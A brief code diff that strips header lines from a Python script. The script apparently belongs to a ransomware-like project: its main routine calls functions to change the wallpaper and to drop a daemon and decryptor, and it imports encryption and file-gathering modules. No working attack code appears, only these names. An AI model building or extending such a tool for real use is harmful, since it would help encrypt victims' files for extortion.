@@ -1,5 +1,3 @@
-#!/bin/bash/env python
-# coding=UTF-8
 import variables
 import asymmetric
 import get_files
@@ -221,4 +219,3 @@ if __name__ == "__main__":
     menu()
     change_wallpaper()
     drop_daemon_and_decryptor()
-
